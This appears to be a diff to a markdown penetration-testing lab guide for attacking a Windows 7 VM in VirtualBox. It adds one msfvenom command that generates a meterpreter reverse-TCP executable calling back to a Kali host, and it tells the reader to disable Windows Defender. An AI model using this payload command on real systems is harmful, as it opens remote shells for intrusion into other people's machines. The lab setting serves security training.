@@ -14,7 +14,7 @@ Make sure you have:
     All VMs on the same network mode (Host-only or Bridged as needed)
 ```
 
-## 🛠️ TRACK 1: Windows Client Compromise (Reverse TCP + Privilege Escalation)
+## 🛠️ TRACK 1: Windows-based client-side attack (via payload delivery)
 ### Step 1: Set Up Vulnerable Windows 7 VM
 ```
 Create a new VM in VirtualBox
@@ -23,6 +23,10 @@ Disable Windows Defender:
 ```
 
 ### Step 2: Generate Malicious Payload
+```
+**Command**: 
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o any_name.exe
 
+```
 
 
